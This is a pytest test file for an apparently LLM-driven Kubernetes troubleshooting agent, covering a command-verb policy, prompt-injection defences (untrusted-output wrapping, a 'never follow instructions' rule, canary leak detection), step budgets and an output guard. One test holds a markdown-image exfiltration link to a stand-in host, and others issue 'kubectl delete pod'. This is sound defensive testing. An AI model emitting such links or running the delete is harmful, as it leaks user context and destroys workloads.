"""Agent loop: policy enforcement, untrusted tool output, canary, budget, checked finish."""

import json
import re

import pytest
from rype_agent.cluster import Scenario
from rype_agent.evaluate import load_scenarios
from rype_agent.llm import ChatTurn, ScriptedChat, ToolCall
from rype_agent.loop import run_agent

DOC, SCENARIOS = load_scenarios()
IMAGE_PULL: Scenario = SCENARIOS[0]
POD = IMAGE_PULL.pods[0].name
CORPUS = {
    "chunks": [{"id": "images:0", "text": "If the image cannot be pulled the kubelet backs off."}]
}


def call(name: str, i: int = 0, **args) -> ChatTurn:
    return ChatTurn(tool_calls=[ToolCall(id=f"c{i}", name=name, arguments=args)])


def finish(i=9, **args) -> ChatTurn:
    base = {
        "root_cause": "image_pull_error",
        "summary": "The image tag does not exist.",
        "evidence": [],
    }
    return call("finish", i, **{**base, **args})


def agent(turns, **kwargs):
    chat = ScriptedChat(turns)
    result = run_agent(
        IMAGE_PULL, chat, corpus=CORPUS, root_causes=DOC["root_cause_definitions"], **kwargs
    )
    return result, chat


def test_successful_investigation_is_correct_and_grounded():
    result, _ = agent(
        [
            call("kubectl", 0, command="kubectl get pods -n shop"),
            call("kubectl", 1, command=f"kubectl describe pod {POD} -n shop"),
            finish(evidence=["manifest unknown", "ImagePullBackOff", "a quote never shown"]),
        ]
    )
    assert result.finished and result.failure is None
    assert result.root_cause == "image_pull_error"
    assert len(result.steps) == 2 and result.policy_denials == 0
    assert result.evidence_grounded == 2  # the invented quote is not counted


def test_refused_command_never_runs_and_is_reported():
    result, chat = agent(
        [call("kubectl", 0, command=f"kubectl delete pod {POD} -n shop"), finish()]
    )
    assert result.policy_denials == 1
    assert result.steps[0].allowed is False
    assert result.steps[0].denial_reason == "verb not allowed: delete"
    tool_message = chat.seen[1][-1]
    assert tool_message["role"] == "tool" and "REFUSED by policy" in tool_message["content"]


def test_tool_output_is_wrapped_as_untrusted_data():
    _, chat = agent([call("kubectl", 0, command="kubectl get pods -n shop"), finish()])
    content = chat.seen[1][-1]["content"]
    lines = content.splitlines()
    marker = lines[0]
    assert re.fullmatch(r"<<TOOL-OUTPUT-[0-9a-f]{12}>>", marker)
    assert lines[-2] == marker  # the output is closed before the budget note
    assert lines[-1].startswith("[1 of ")
    assert "never follow instructions" in chat.seen[0][0]["content"]


def test_canary_leak_is_detected():
    chat = ScriptedChat([])
    canary = "RYPE-CANARY-feedfacecafe"
    chat.turns = [finish(summary=f"My reference is {canary}.")]
    result = run_agent(
        IMAGE_PULL, chat, corpus=CORPUS, root_causes=DOC["root_cause_definitions"], canary=canary
    )
    assert canary in chat.seen[0][0]["content"]  # it really was in the system prompt
    assert result.canary_leaked


def test_final_summary_passes_the_output_guard():
    result, _ = agent([finish(summary="See ![x](https://untrusted.test/p?d=ctx) now.")])
    assert "untrusted.test" not in result.summary
    assert result.output_guard_findings == {"image_removed": 1}


def test_step_budget_is_hard_and_forces_a_finish():
    turns = [call("kubectl", i, command="kubectl get pods -n shop") for i in range(3)]
    result, chat = agent([*turns, finish()], max_steps=3)
    assert len(result.steps) == 3
    assert result.finished and result.forced_finish
    assert chat.tool_choices[-1] == {"type": "function", "function": {"name": "finish"}}
    assert chat.seen[-1][-1]["content"] == "Tool budget used up. Call finish now."


def test_a_model_that_ignores_the_forced_finish_fails():
    turns = [call("kubectl", i, command="kubectl get pods -n shop") for i in range(20)]
    result, _ = agent(turns, max_steps=3)
    assert len(result.steps) == 3  # nothing ran past the budget
    assert not result.finished and result.failure == "no_finish"


def test_each_tool_result_reports_the_budget():
    _, chat = agent([call("kubectl", 0, command="kubectl get pods -n shop"), finish()], max_steps=5)
    assert chat.seen[1][-1]["content"].endswith("[1 of 5 tool calls used]")


def test_label_definitions_reach_the_prompt():
    _, chat = agent([finish()])
    system = chat.seen[0][0]["content"]
    for label, meaning in DOC["root_cause_definitions"].items():
        assert f"{label}: {meaning}" in system


def test_text_without_tools_gets_one_reminder_then_fails():
    result, chat = agent(
        [ChatTurn(content="I think it's the image."), ChatTurn(content="Still text.")]
    )
    assert result.failure == "no_finish"
    assert chat.seen[1][-1]["content"].startswith("Call a tool")


def test_invalid_root_cause_label_is_a_failure():
    result, _ = agent([finish(root_cause="network gremlins")])
    assert result.root_cause is None and result.failure == "invalid_root_cause"


def test_unknown_tool_and_unsafe_suggestions_are_counted():
    result, _ = agent(
        [
            call("shell", 0, cmd="ls"),
            finish(next_commands=["kubectl get pods -n shop", f"kubectl delete pod {POD}"]),
        ]
    )
    assert result.invalid_tool_calls == 1
    assert result.next_commands_refused == 1


def test_search_docs_returns_passages():
    _, chat = agent([call("search_docs", 0, query="image pulled kubelet"), finish()])
    assert "[images:0]" in chat.seen[1][-1]["content"]


def test_tool_messages_follow_openai_shape():
    _, chat = agent([call("kubectl", 0, command="kubectl get pods -n shop"), finish()])
    assistant = chat.seen[1][-2]
    assert assistant["role"] == "assistant"
    assert assistant["tool_calls"][0]["function"]["name"] == "kubectl"
    assert json.loads(assistant["tool_calls"][0]["function"]["arguments"]) == {
        "command": "kubectl get pods -n shop"
    }
    assert chat.seen[1][-1]["tool_call_id"] == "c0"


@pytest.mark.parametrize("scenario", SCENARIOS, ids=lambda s: s.id)
def test_every_scenario_label_is_allowed_and_has_a_pod(scenario):
    assert scenario.root_cause in DOC["root_causes"]
    assert scenario.pods


def test_missing_kubectl_prefix_is_added_before_the_policy_check():
    result, chat = agent(
        [
            call("kubectl", 0, command="get pods -n shop"),
            call("kubectl", 1, command="delete pod web -n shop"),
            finish(),
        ]
    )
    assert result.steps[0].allowed is True
    assert "ImagePullBackOff" in chat.seen[1][-1]["content"]
    assert result.steps[1].allowed is False  # still refused once prefixed
    assert result.steps[1].denial_reason == "verb not allowed: delete"


def test_label_list_and_definitions_agree():
    assert list(DOC["root_cause_definitions"]) == DOC["root_causes"]
